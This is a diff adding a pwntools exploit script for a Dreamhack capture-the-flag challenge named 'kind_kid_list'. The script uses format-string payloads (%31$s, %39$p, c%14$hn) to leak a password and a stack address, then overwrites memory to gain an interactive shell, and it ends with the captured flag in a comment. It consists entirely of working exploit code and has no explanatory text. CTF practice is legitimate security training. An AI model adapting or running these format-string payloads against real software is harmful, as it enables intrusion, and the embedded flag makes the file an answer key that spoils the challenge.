@@ -1,0 +1,44 @@
+from pwn import *
+
+script = '''
+b *main
+b *main + 740
+breakrva 0x1655
+'''
+
+while(True):
+    p = remote("host1.dreamhack.games", 20828)
+    #p = process("./kind_kid_list")
+
+    p.sendlineafter(b">> ", b"2")
+    p.sendlineafter(b"Password : ", b"%31$s")
+    password = u64(p.recv(7) + b"\x00")
+    print(hex(password))
+
+    p.sendlineafter(b">> ", b"2")
+    p.sendlineafter(b"Password : ", p64(password))
+    if(p.recv(6) == b"Name :"):
+        break
+    else:
+        p.close()
+    
+#gdb.attach(p, gdbscript = script)
+
+p.sendline(b"wyv3rn")
+
+p.sendlineafter(b">> ", b"2")
+p.sendlineafter(b"Password : ", b"%39$p")
+rsp = int(p.recvuntil(b"is")[:-2:], 16) - 0x1f8
+print(hex(rsp))
+
+p.sendlineafter(b">> ", b"2")
+p.sendlineafter(b"Password : ", p64(password))
+p.sendlineafter(b"Name : ", p64(rsp + 0xb9))
+
+p.sendlineafter(b">> ", b"2")
+p.sendlineafter(b"Password : ", b"c%14$hn")
+
+p.sendlineafter(b">> ", b"3")
+
+p.interactive()
+#DH{ha99y_m3rry_cr1s7mas_w17h_wyv3rn}
